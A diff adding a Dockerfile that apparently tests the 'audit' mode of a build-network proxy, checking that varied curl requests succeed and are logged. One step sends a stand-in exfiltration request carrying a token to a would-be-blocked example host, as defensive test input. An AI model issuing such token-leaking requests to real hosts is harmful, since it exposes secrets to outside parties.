@@ -1,0 +1,68 @@
+# See Dockerfile.inspect-restrict for why this image is used as-is.
+FROM alpine/curl@sha256:1a4d725751c5bd50297ee243db5d4df8ac5aabdf7030dd40dcec3bc3fdaa1cfa
+
+SHELL ["/bin/sh", "-c"]
+
+ENV S='curl -sS --max-time 10'
+
+# ---------------------------------------------------------------------------
+# No rules are configured. audit's claim is that it records everything anyway,
+# so every request below must succeed and every one must be in the log with its
+# method and full URL.
+# ---------------------------------------------------------------------------
+
+# [HTTPS on the default port]
+RUN echo "=== [HTTPS] ===" && \
+    OUT=$($S https://allowed.example.com/public/pkg.tgz) && \
+    echo "$OUT" && \
+    case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [Several paths under one prefix]
+# What a package fetch looks like: the paths vary, their prefix does not. The
+# generated restrict rules must keep that prefix and widen only what varied.
+RUN echo "=== [Varying paths] ===" && \
+    $S https://allowed.example.com/public/a/one.tgz && \
+    $S https://allowed.example.com/public/b/two.tgz && \
+    echo "OK"
+
+# [A method no host rule could distinguish]
+RUN echo "=== [POST] ===" && \
+    OUT=$($S -X POST https://api.example.com/v1/thing) && \
+    echo "$OUT" && \
+    case "$OUT" in API\ POST*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [Plaintext on a port nobody declared]
+# This is what audit exists for: a build reaches 9080 without anyone having
+# said 9080 carries plaintext, and it is still recorded.
+RUN echo "=== [Plaintext on 9080] ===" && \
+    OUT=$($S http://allowed.example.com:9080/public/pkg.tgz) && \
+    echo "$OUT" && \
+    case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [TLS on a port nobody declared]
+RUN echo "=== [TLS on 9443] ===" && \
+    OUT=$($S https://allowed.example.com:9443/private/secret) && \
+    echo "$OUT" && \
+    case "$OUT" in PRIVATE\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [A host no rule would have allowed]
+# audit refuses nothing, so this reaches the origin and is recorded rather than
+# being turned into a 403.
+RUN echo "=== [Would-be-blocked host] ===" && \
+    OUT=$($S "https://blocked.example.com/exfil?token=SECRET-VALUE") && \
+    echo "$OUT" && \
+    case "$OUT" in ROOT\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [Package manager - apk has no CA store of its own, and audit still injects]
+# audit enforces nothing, but TLS is still terminated, so the CA still has to
+# be there for apk to get past the handshake at all.
+RUN echo "=== [Package manager - apk over the injected CA] ===" && \
+    echo "https://allowed.example.com/public" > /etc/apk/repositories && \
+    OUT=$(apk update 2>&1); \
+    echo "$OUT" && \
+    case "$OUT" in \
+      *"not trusted"*) echo "FAILED: TLS was not trusted" && exit 1 ;; \
+      *) echo "OK: reached the origin over TLS" ;; \
+    esac
+
+RUN echo "=== End of test ==="
